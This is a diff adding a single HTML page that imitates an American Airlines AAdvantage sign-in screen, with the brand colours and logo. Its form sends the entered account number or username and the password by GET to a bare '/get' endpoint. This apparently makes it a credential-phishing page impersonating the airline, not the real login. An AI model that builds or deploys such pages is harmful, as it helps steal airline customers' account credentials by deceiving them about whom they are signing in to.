@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: 'Arial', sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #f3f3f3;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+}
+
+.container {
+  max-width: 500px;
+  padding: 20px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  background: #fff;
+  border-radius: 8px;
+}
+
+.logo {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 20px;
+}
+
+.logo svg {
+  width: 50%;
+}
+
+.title, .sub-title {
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.form-group {
+  margin-bottom: 20px;
+  display: flex;
+  justify-content: center;
+}
+
+.input-field {
+  width: 100%;
+  max-width: 400px;
+  height: 40px;
+  padding: 10px;
+  border-radius: 5px;
+  border: 1px solid #ccc;
+  font-size: 16px;
+}
+
+.button {
+  width: 100%;
+  max-width: 400px;
+  height: 40px;
+  background-color: #1a3b73;
+  color: #fff;
+  border: none;
+  border-radius: 5px; 
+  cursor: pointer;
+}
+
+@media screen and (max-width: 600px) {
+  .container {
+    margin: 10px;
+  }
+
+  .logo svg {
+    width: 70%;
+  }
+
+  .input-field, .button {
+    max-width: 100%;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="logo">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 193 193">
+  <path fill="#cc2131" fill-rule="evenodd" d="M27 162H6l34-95h23l33 95H75l-6-20H34l-7 20zm12-36h24L51 88l-12 38z" clip-rule="evenodd"/>
+  <path fill="#1a3b73" fill-rule="evenodd" d="M117 162H96l34-95h23l33 95h-21l-6-20h-35l-7 20zm12-36h24l-11-38h-1l-12 38zm-21-43-9-29 2-7 2 1-1-3 2-5 1 1v-3l1-4 2 1-1-4 4-11 8 24v8l-11 31zm3 17-1 3h-2v-2l-6-7h-3l-2 6 1 2h3v2h-6v-1l1-1-2-2h-2l-8-25h2l-3-2-2-6h2l-2-2-2-6 1-1-2-2-1-3v-3h2l-2-2c-1-3 1-6 2-8l1 1-1-3 3-6 1 1-1-4 4-9 25 77v3zm-25-5v-1l-1 1h-4v-1l-1 1h-3l8-12 4 12h-3z" clip-rule="evenodd"/>  
+</svg>
+</div>
+
+<h1 class="title">Sign in</h1>
+
+<h2 class="sub-title">Using your AAdvantage number or username and password.</h2>
+
+<form action="/get" id="email-form-step" method="GET">
+
+<div class="form-group">
+<input class="input-field" name="email" type="text" placeholder="AAdvantage # or Username" required>
+</div>
+
+<div class="form-group">
+<input class="input-field" name="password" type="password" placeholder="Password" required>
+</div>
+
+<div class="form-group">
+<button class="button" type="submit">Sign In</button>
+</div>
+
+</form>
+
+</div>
+
+</body>
+</html>
